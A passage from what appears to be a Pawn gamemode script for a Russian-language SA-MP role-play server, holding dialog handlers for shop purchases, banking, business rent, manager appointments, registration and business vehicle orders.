				case 5:
				{
					
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить верёвку?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,194,DIALOG_STYLE_MSGBOX,"Покупка верёвки",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",2);
	
				}
    			case 6:
			    {
			        
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить трость?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,44,DIALOG_STYLE_MSGBOX,"Покупка Трости",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",15);
					SetPVarInt(playerid,"AmmoSkok",1);
			    }
    			case 7:
			    {
			        
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить парашют?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,44,DIALOG_STYLE_MSGBOX,"Покупка Парашюта",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",46);

					SetPVarInt(playerid,"AmmoSkok",1);
			    }
   				case 8:
				{
					
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить пачку сигарет?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,195,DIALOG_STYLE_MSGBOX,"Покупка пачти сигарет",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",2);
				}
				case 9:
				{

					static const fmt_str1[] = "{FFFFFF}Вы хотите купить шашку 'Такси'?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,267,DIALOG_STYLE_MSGBOX,"Покупка шашки 'Такси'",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",2);
				}
				case 10:
				{

					static const fmt_str1[] = "{FFFFFF}Вы хотите купить балончик с краской?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,223,DIALOG_STYLE_MSGBOX,"Покупка балончика с красной",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",2);
				}
				case 11:
				{

					static const fmt_str1[] = "{FFFFFF}Вы хотите купить отмычку?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,495,DIALOG_STYLE_MSGBOX,"Покупка отымчки",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",2);
				}
			}
	    }
	    case 160:
	    {
	        if(!response) return true;
	        new cena = ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][listitem];
	        new prods = ProdInfo[GetPVarInt(playerid,"PBIZ")][prodMinus][listitem];
	        SetPVarInt(playerid,"AmmoProd",prods);
	        SetPVarInt(playerid,"AmmoPrice",cena);
	        SetPVarInt(playerid,"AmmoList",(!BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4]) ? (listitem-1) : (listitem));
	        if(!BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4]) listitem++;
			switch(listitem)
			{
			    case 0:
			    {
					if(!GetPVarInt(playerid,"Oplata"))
					{
					    ShowPlayerDialog(playerid,467,DIALOG_STYLE_INPUT,"PIN-CODE","{ffffff}Введите PIN-CODE от карты:\n\n","Далее","Отмена");
					}
					else
					{
						DeletePVar(playerid,"Oplata");
						ShowMenuBiz(playerid);
					}
			    }
				case 1:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Бургер?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка бургера",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);

				}
				case 2:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Меню 'Эконом-шот'?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Меню 'Эконом-шот'",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);

					SetPVarInt(playerid,"AmmoObject",2353);
					SetPVarInt(playerid,"Golod",50);
				}
				case 3:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Меню 'Стардарт-шот'?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Меню 'Стардарт-шот'",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
				
					SetPVarInt(playerid,"AmmoObject",2215);
	
					SetPVarInt(playerid,"Golod",80);
				}
				case 4:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Меню 'Роял-шот'?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Меню 'Роял-шот'",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
					
					SetPVarInt(playerid,"AmmoObject",2214);
				
					SetPVarInt(playerid,"Golod",100);
				}
				case 5:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Газировка 'Sprunk'?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Газировка 'Sprunk'",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",1);

				}
			}
	    }
	    case 161:
	    {
	        if(!response) return true;
         	new cena = ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][listitem];
	        new prods = ProdInfo[GetPVarInt(playerid,"PBIZ")][prodMinus][listitem];
	        SetPVarInt(playerid,"AmmoProd",prods);
	        SetPVarInt(playerid,"AmmoPrice",cena);
	        if(!BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4]) listitem++;
			switch(listitem)
			{
			    case 0:
			    {
					if(!GetPVarInt(playerid,"Oplata"))
					{
					    ShowPlayerDialog(playerid,467,DIALOG_STYLE_INPUT,"PIN-CODE","{ffffff}Введите PIN-CODE от карты:\n\n","Далее","Отмена");
					}
					else
					{
						DeletePVar(playerid,"Oplata");
						ShowMenuBiz(playerid);
					}
			    }
      			case 1:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Маленькую порцию?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Маленькой порции",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",1);
				
				}
				case 2:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Среднюю порцию?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Средней порции",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",2);
		
				}
				case 3:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Большую порцию?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Большой порции",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",3);
				
				}
			}
	    }
	    case 162:
	    {
	        if(!response) return true;
	        new cena = ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][listitem];
	        new prods = ProdInfo[GetPVarInt(playerid,"PBIZ")][prodMinus][listitem];
	        SetPVarInt(playerid,"AmmoProd",prods);
	        SetPVarInt(playerid,"AmmoPrice",cena);
	        SetPVarInt(playerid,"AmmoList",(!BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4]) ? (listitem-1) : (listitem));
	        if(!BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4]) listitem++;
			switch(listitem)
			{
			    case 0:
			    {
					if(!GetPVarInt(playerid,"Oplata"))
					{
					    ShowPlayerDialog(playerid,467,DIALOG_STYLE_INPUT,"PIN-CODE","{ffffff}Введите PIN-CODE от карты:\n\n","Далее","Отмена");
					}
					else
					{
						DeletePVar(playerid,"Oplata");
						ShowMenuBiz(playerid);
					}
			    }
				case 1:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Сигарету?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Сигары",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
				}
				case 2:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Газировку 'Sprunk'?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Газировки 'Sprunk'",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
		
				}
				case 3:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Пиво?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Пива",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
		
				}
				case 4:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Вино?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Вина",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
			
				}
				case 5:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Виски?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Виски",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
		
				}
				case 6:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Абсент?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Абсента",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
	
				}
			}
	    }
	    
	    case 164:
	    {
	        if(!response) return true;
	        switch(listitem)
	        {
	            case 0:
	            {
	               // format(query, sizeof(query), "SELECT * FROM banks WHERE idacc = '%d'",PlayerInfo[playerid][pID]);
					//mysql_tquery(mysql, query, "ShowBanks", "d", playerid);
					query = "";
					new str[144];
				 	format(str,sizeof(str),"{20BA09}Открыть новый счет\n{A8EFFF}Основной: %d${ffffff}\n",PlayerInfo[playerid][pBank]);
					strcat(query, str);
					for(new i = 1; i<= TOTALBANKS[playerid]; i++)
					{
					    if(!strlen(BanksName[playerid][i])) continue;
						format(str,sizeof(str),"%s: %d\n",BanksName[playerid][i],BanksInfo[playerid][bankCash][i]);
						strcat(query, str);
					}
					ShowPlayerDialog(playerid,433,DIALOG_STYLE_LIST,"Банковские счета",query,"Далее","Отмена");
	                

	            }
	            case 1:
	            {
	               	if(PlayerInfo[playerid][pLevel] < 2) return SendClientMessage(playerid, CGREY, "Передача денег доступна с 2 уровня");
					ApplyDynamicActorAnimation(BankBot[GetPVarInt(playerid,"BankBot")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
					Update3DTextLabelTextEx(BankText[GetPVarInt(playerid,"BankBot")],-1,"Кому хотите перевести деньги?");
					SetTimerEx("ClearBotGlobal", 3000, false, "dd", BankBot[GetPVarInt(playerid,"BankBot")],_:BankText[GetPVarInt(playerid,"BankBot")]);
	                ShowPlayerDialog(playerid, 32, DIALOG_STYLE_INPUT, "Перевод денег","{FFFFFF}Введите ID человека, которому хотите перевести деньги:" , "Далее","Назад");
	            }
	            
	            case 2:
	            {
	                if(GetPlayerBiz(playerid))
					{
					    ApplyDynamicActorAnimation(BankBot[GetPVarInt(playerid,"BankBot")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
						Update3DTextLabelTextEx(BankText[GetPVarInt(playerid,"BankBot")],-1,"Сколько хотите снять со счета бизнеса?");
						SetTimerEx("ClearBotGlobal", 3000, false, "dd", BankBot[GetPVarInt(playerid,"BankBot")],_:BankText[GetPVarInt(playerid,"BankBot")]);
						ShowPlayerDialog(playerid, 61, DIALOG_STYLE_INPUT, "Снять со счета бизнеса","{FFFFFF}Укажите сумму снятие со счета бизнеса:" , "Готово","Назад");
					}
					else SendClientMessage(playerid,CGREY,"Вы не владеете бизнесом");
	            }
	            case 3:
	            {
	                if(GetPlayerBiz(playerid) || GetPlayerUpr(playerid))
					{
					    ApplyDynamicActorAnimation(BankBot[GetPVarInt(playerid,"BankBot")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
						Update3DTextLabelTextEx(BankText[GetPVarInt(playerid,"BankBot")],-1,"На сколько хотите пополонить счет бизнеса?");
						SetTimerEx("ClearBotGlobal", 3000, false, "dd", BankBot[GetPVarInt(playerid,"BankBot")],_:BankText[GetPVarInt(playerid,"BankBot")]);
						ShowPlayerDialog(playerid, 62, DIALOG_STYLE_INPUT, "Полонить счет бизнеса","{FFFFFF}Укажите сумму пополнения счета бизнеса:" , "Готово","Назад");
					}
					else SendClientMessage(playerid,CGREY,"Вы не владеете бизнесом");
	            }
	            case 4:
	            {
	                if(GetPlayerBiz(playerid) || GetPlayerUpr(playerid))
					{
					    ApplyDynamicActorAnimation(BankBot[GetPVarInt(playerid,"BankBot")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
						Update3DTextLabelTextEx(BankText[GetPVarInt(playerid,"BankBot")],-1,"На сколько хотите оплатить аренду земли?");
						SetTimerEx("ClearBotGlobal", 3000, false, "dd", BankBot[GetPVarInt(playerid,"BankBot")],_:BankText[GetPVarInt(playerid,"BankBot")]);
						ShowPlayerDialog(playerid, 165, DIALOG_STYLE_INPUT, "На сколько хотите оплатить?","{FFFFFF}Введите на сколько хотите оплатить бизнес:\nОт 1 до 30 дней." , "Выбор","Назад");
					}
					else SendClientMessage(playerid,CGREY,"Вы не владеете бизнесом");
	            }
				case 5:
				{
				    if(GetPlayerHouse(playerid))
					{
					    ApplyDynamicActorAnimation(BankBot[GetPVarInt(playerid,"BankBot")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
						Update3DTextLabelTextEx(BankText[GetPVarInt(playerid,"BankBot")],-1,"На сколько хотите оплатить дом?");
						SetTimerEx("ClearBotGlobal", 3000, false, "dd", BankBot[GetPVarInt(playerid,"BankBot")],_:BankText[GetPVarInt(playerid,"BankBot")]);
						ShowPlayerDialog(playerid, 36, DIALOG_STYLE_INPUT, "На сколько хотите оплатить?","{FFFFFF}Введите на сколько хотите оплатить дом:\nОт 1 до 30 дней." , "Выбор","Назад");
					}
					else SendClientMessage(playerid,CGREY,"Вы не владеете домом");
				}
				case 6:
				{
   					new kek = 0;
				   	query = "";
				   	for(new i = 1; i<= TOTALV; i++)
				   	{
				   	    if(VInfo[i][vcar] == INVALID_VEHICLE_ID) continue;
				   	    if(strcmp(VInfo[i][vname], PlayerInfo[playerid][pSendername], true) == 0)
				   	    {
				   	        ListNick[playerid][kek] = i;
				   	        kek++;
				       		static const fmt_string2[] = "{FFFFFF}%s | ID: %i | Номера: %s\n";
							new str2[sizeof(fmt_string2)+64];
							format(str2, sizeof(str2), fmt_string2,VehicleNameS[VInfo[i][vmodel]-400],VInfo[i][vcar],VInfo[i][vnumber]);
							strcat(query, str2);
				   	    }
				   	}
				   	if(kek == 0) return SendClientMessage(playerid,CGREY,"Вы не владеете транспортом!");
				   	ShowPlayerDialog(playerid,239,DIALOG_STYLE_LIST,"Выберите траснспорт",query,"Выбрать","Отмена");
				}
				case 7:
				{
				    ShowPlayerDialog(playerid,462,DIALOG_STYLE_INPUT,"PIN-CODE","{ffffff}Введите новый PIN-CODE от карты:\n\n","Далее","Отмена");
				}
				case 8:
				{
					ApplyDynamicActorAnimation(BankBot[GetPVarInt(playerid,"BankBot")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
					Update3DTextLabelTextEx(BankText[GetPVarInt(playerid,"BankBot")],-1,"На сколько хотите пополонить общак семьи?");
					SetTimerEx("ClearBotGlobal", 3000, false, "dd", BankBot[GetPVarInt(playerid,"BankBot")],_:BankText[GetPVarInt(playerid,"BankBot")]);
					ShowPlayerDialog(playerid, 234, DIALOG_STYLE_INPUT, "Полонить общак семьи","{FFFFFF}Укажите сумму пополнения общака семьи:" , "Готово","Назад");
				}
				case 9:
				{
					ApplyDynamicActorAnimation(BankBot[GetPVarInt(playerid,"BankBot")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
					Update3DTextLabelTextEx(BankText[GetPVarInt(playerid,"BankBot")],-1,"Сколько хотите снять с общака семьи?");
					SetTimerEx("ClearBotGlobal", 3000, false, "dd", BankBot[GetPVarInt(playerid,"BankBot")],_:BankText[GetPVarInt(playerid,"BankBot")]);
					ShowPlayerDialog(playerid, 235, DIALOG_STYLE_INPUT, "Снять с общака семьи","{FFFFFF}Укажите сумму снятия с общака семьи:" , "Готово","Назад");
				}
				
	        }
	    }
   		case 165:
		{
		    if(!response) return true;
   			new krek;
		    if(sscanf(inputtext,"i",krek) || krek < 1 || krek > 30) return ShowPlayerDialog(playerid, 165, DIALOG_STYLE_INPUT, "На сколько хотите оплатить?","{FFFFFF}Введите на сколько хотите оплатить аренду земли:\nОт 1 до 30 дней." , "Выбор","Назад");
		    if(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZeml] > gettime()+60*60*24*krek) return InfoOplBiz(playerid);
			SetPVarInt(playerid,"Skoka",(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]*OplBiz/100)*krek);
			SetPVarInt(playerid,"Skoka1",60*60*24*krek);
			static const fmt_str[] = "{FFFFFF}Стоимость платы за аренду земли на %i дн. составит: $%i\nОплатить?";
			new string[sizeof(fmt_str)+10+10];
			format(string, sizeof(string), fmt_str, krek, (BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]*OplBiz/100)*krek);
			ShowPlayerDialog(playerid,166,DIALOG_STYLE_MSGBOX,"Оплата аренды земли",string,"Да","Нет");
		}
   		case 166:
		{
		    if(!response) return DeletePVar(playerid,"Skoka");
		    if(PlayerInfo[playerid][pBank] < GetPVarInt(playerid,"Skoka")) return SendClientMessage(playerid,CGREY,"У вас недостаточно средств");
			if(GetPlayerBiz(playerid)  || GetPlayerUpr(playerid))
			{
			    if(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZeml] <= 0) BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZeml] = gettime() + GetPVarInt(playerid,"Skoka1");
				else
				{
				    new k = BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZeml] - gettime();
				    BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZeml] = gettime() + GetPVarInt(playerid,"Skoka1") + k;
				}
			    if(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZeml] > 24 && BizInfo[GetPVarInt(playerid,"PlayerBiz")][bLockTime] > 0) BizInfo[GetPVarInt(playerid,"PlayerBiz")][bLockTime] = 0;
			    PlayerInfo[playerid][pBank] -= GetPVarInt(playerid,"Skoka");
			    Kazna += GetPVarInt(playerid,"Skoka");
			    SetMatsInt("kazna",Kazna);
				static const fmt_str[] = "Вы внесли плату за бизнес на: %s Стоимость: $%i";
				new string[sizeof(fmt_str)+10+10+5];
				format(string, sizeof(string), fmt_str, timec(gettime()+GetPVarInt(playerid,"Skoka1")),GetPVarInt(playerid,"Skoka"));
				SendClientMessage(playerid,CREWARD,string);
				query = "";
				format(query, sizeof(query), "UPDATE `biz` SET `zeml` = %i WHERE id = '%d' LIMIT 1",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZeml],GetPVarInt(playerid,"PlayerBiz"));
				mysql_tquery(mysql,query);
				DeletePVar(playerid,"Skoka");
				DeletePVar(playerid,"Skoka1");
			}
			else SendClientMessage(playerid,CGREY,"Вы не владеете бизнесом!");
		}
		case 168:
		{
		    if(!response) return BizMenu(playerid);
   			new krek;
		    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid,168,DIALOG_STYLE_INPUT,"Цена входа","{FFFFFF}Введите цену входа, которую вы хотите поставить на свой бизнес:","Далее","Назад");
		    if(krek < 0 || krek > 100)
		    {
		        SendClientMessage(playerid,CGREY,"Цена входа может быть от 0 до 100");
		        ShowPlayerDialog(playerid,168,DIALOG_STYLE_INPUT,"Цена входа","{FFFFFF}Введите цену входа, которую вы хотите поставить на свой бизнес:","Далее","Назад");
		        return true;
		    }
			BizInfo[GetPVarInt(playerid,"PlayerBiz")][bVhod] = krek;
			SetBizInt(GetPVarInt(playerid,"PlayerBiz"),"vhod",krek);
			static const fmt_string1[] = "[BIZ]{FFFFFF} Вы установили цену входа в бизнес. Цена входа: %i";
			new str1[sizeof(fmt_string1)+4];
			format(str1, sizeof(str1), fmt_string1,BizInfo[GetPVarInt(playerid,"PlayerBiz")][bVhod]);
			SendClientMessage(playerid,CREWARD,str1);
			UpdateBiz(GetPVarInt(playerid,"PlayerBiz"));
			BizMenu(playerid);
		}
		case 170:
		{
		    if(!response) return BizMenu(playerid);
   			new krek;
		    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid,170,DIALOG_STYLE_INPUT,"Назначить управляющего","{FFFFFF}Введите ID игрока, которого хотите назначить управляющим:","Далее","Назад");
            new Float:x,Float:y,Float:z;
    		GetPlayerPos(krek,x,y,z);
			if(!IsPlayerConnected(krek) || PlayerLogged[krek] == false || !IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z))
		    {
		        SendClientMessage(playerid,CGREY,"Игрок не рядом с вами");
		        ShowPlayerDialog(playerid,170,DIALOG_STYLE_INPUT,"Назначить управляющего","{FFFFFF}Введите ID игрока, которого хотите назначить управляющим:","Далее","Назад");
		        return true;
		    }
			if(GetPlayerBiz(krek)) return SendClientMessage(playerid,CGREY,"У игрока уже есть бизнес");
			if(GetPred(krek) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
			SendClientMessage(playerid,CREWARD,"Вы предложили игроку стать управляющим в Вашем бизнесе");
		   	static const fmt_string1[] = "%s предложил Вам стать управляющим в бизнесе %s";
			new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+50];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],BizInfo[GetPVarInt(playerid,"PlayerBiz")][bName]);
			SendClientMessage(krek,0xFF7F50FF,str1);
			SendClientMessage(krek,CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
			SetPVarInt(krek,"Upr",1);
			SetPVarInt(krek,"UprID",playerid);
		}
		case 171:
		{
			if(response)
			{
			    new krek[32];
			    if(sscanf(inputtext,"s[32]",krek)) return ShowPlayerDialog(playerid, 171, DIALOG_STYLE_INPUT, "Регистрация","{FFFFFF}Повторите введённый вами пароль для продолжения регистрации.", "Далее", "");
			    if(strfind(inputtext,PlayerInfo[playerid][pPassword],true) != -1)
			    {
			        ShowPlayerDialog(playerid, 154, DIALOG_STYLE_INPUT, "Регистрация | Шаг [3/8]","{FFFFFF}Введите существующий адрес электронной почты.\nОн может понадобиться для восстановления пароля вашего аккаунта.", "Далее", "");
			    }
			    else ShowPlayerDialog(playerid, 171, DIALOG_STYLE_INPUT, "Регистрация | Шаг [2/8]","{FFFFFF}Повторите введённый вами пароль для продолжения регистрации.\n\n{F85A5A}- Пароли не совпадают", "Далее", "");
			}
		}
		case 172:
		{
		    if(!response) return BizMenu(playerid);
		    switch(listitem)
		    {
		        case 0: SetPVarInt(playerid,"CarModel",431),SetPVarInt(playerid,"CarPrice",2500);
		        case 1: SetPVarInt(playerid,"CarModel",437),SetPVarInt(playerid,"CarPrice",5000);
		    }
		   	static const fmt_string1[] = "{FFFFFF}Вы действительно хотите заказать транспорт (id: %i) за %i$?";
			new str1[sizeof(fmt_string1)+30];
			format(str1, sizeof(str1), fmt_string1,GetPVarInt(playerid,"CarModel"),GetPVarInt(playerid,"CarPrice"));
			ShowPlayerDialog(playerid,177,DIALOG_STYLE_MSGBOX,"Покупка транспорта",str1,"Да","Отмена");
		}
		case 173:
		{
		    if(!response) return BizMenu(playerid);
		    switch(listitem)
		    {
		        case 0: SetPVarInt(playerid,"CarModel",438),SetPVarInt(playerid,"CarPrice",5000);
		        case 1: SetPVarInt(playerid,"CarModel",420),SetPVarInt(playerid,"CarPrice",7500);
		    }
		   	static const fmt_string1[] = "{FFFFFF}Вы действительно хотите заказать транспорт (id: %i) за %i$?";
			new str1[sizeof(fmt_string1)+30];
			format(str1, sizeof(str1), fmt_string1,GetPVarInt(playerid,"CarModel"),GetPVarInt(playerid,"CarPrice"));
			ShowPlayerDialog(playerid,177,DIALOG_STYLE_MSGBOX,"Покупка транспорта",str1,"Да","Отмена");
		}
		case 174:
		{
		    if(!response) return BizMenu(playerid);
		    switch(listitem)
		    {
		        case 0: SetPVarInt(playerid,"CarModel",574),SetPVarInt(playerid,"CarPrice",2500);
		        case 1: SetPVarInt(playerid,"CarModel",525),SetPVarInt(playerid,"CarPrice",5500);
		    }
		   	static const fmt_string1[] = "{FFFFFF}Вы действительно хотите заказать транспорт (id: %i) за %i$?";
			new str1[sizeof(fmt_string1)+30];
			format(str1, sizeof(str1), fmt_string1,GetPVarInt(playerid,"CarModel"),GetPVarInt(playerid,"CarPrice"));
			ShowPlayerDialog(playerid,177,DIALOG_STYLE_MSGBOX,"Покупка транспорта",str1,"Да","Отмена");
		}
		case 175:
		{
		    if(!response) return BizMenu(playerid);
		    switch(listitem)
		    {
		        case 0: SetPVarInt(playerid,"CarModel",459),SetPVarInt(playerid,"CarPrice",4500);
		        case 1: SetPVarInt(playerid,"CarModel",414),SetPVarInt(playerid,"CarPrice",5500);
		        case 2: SetPVarInt(playerid,"CarModel",456),SetPVarInt(playerid,"CarPrice",7500);
		        case 3: SetPVarInt(playerid,"CarModel",525),SetPVarInt(playerid,"CarPrice",5500);
		        //case 3: SetPVarInt(playerid,"CarModel",443),SetPVarInt(playerid,"CarPrice",10000);
		    }
		   	static const fmt_string1[] = "{FFFFFF}Вы действительно хотите заказать транспорт (id: %i) за %i$?";
			new str1[sizeof(fmt_string1)+30];
			format(str1, sizeof(str1), fmt_string1,GetPVarInt(playerid,"CarModel"),GetPVarInt(playerid,"CarPrice"));
			ShowPlayerDialog(playerid,177,DIALOG_STYLE_MSGBOX,"Покупка транспорта",str1,"Да","Отмена");
		}
		case 176:
		{
		    if(!response) return BizMenu(playerid);
			CarJob[GetPVarInt(playerid,"IDCAR")][jidcar] = 0;
			BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney] += GetProcent(CarJob[GetPVarInt(playerid,"IDCAR")][jcarpr]);
			CarJob[GetPVarInt(playerid,"IDCAR")][jcarpr] = 0;
			DestroyVehicle(CarJob[GetPVarInt(playerid,"IDCAR")][jcar]);
			CarJob[GetPVarInt(playerid,"IDCAR")][jcar] = INVALID_VEHICLE_ID;
			SetBizInt(GetPVarInt(playerid,"PlayerBiz"),"money",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney]);
			query = "";
			format(query, sizeof(query), "UPDATE carjob SET idcar = 0,carpr = 0 WHERE id = '%d' LIMIT 1",GetPVarInt(playerid,"IDCAR"));
			mysql_tquery(mysql,query);
			SendClientMessage(playerid,CREWARD,"[BIZ]{FFFFFF} Вы успешно продали транспорт бизнеса. Деньги зачислены на счёт бизнеса");
			DeletePVar(playerid,"IDCAR");
		}
		case 177:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"CarModel");
		        DeletePVar(playerid,"CarPrice");
		        DeletePVar(playerid,"IDCAR");
		        return BizMenu(playerid);
		    }
		    if(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney] < GetPVarInt(playerid,"CarPrice"))
		    {
		        SendClientMessage(playerid,CGREY,"Недостаточно средств на счету бизнеса");
		        DeletePVar(playerid,"CarModel");
		        DeletePVar(playerid,"CarPrice");
		        DeletePVar(playerid,"IDCAR");
		        return BizMenu(playerid);
		    }
        	SendClientMessage(playerid,CREWARD,"[BIZ]{FFFFFF} Вы успешно заказали транспорт!");
			CarJob[GetPVarInt(playerid,"IDCAR")][jidcar] = GetPVarInt(playerid,"CarModel");
			CarJob[GetPVarInt(playerid,"IDCAR")][jcarpr] =GetPVarInt(playerid,"CarPrice");
			BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney] -= GetPVarInt(playerid,"CarPrice");
			SetBizInt(GetPVarInt(playerid,"PlayerBiz"),"money",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney]);
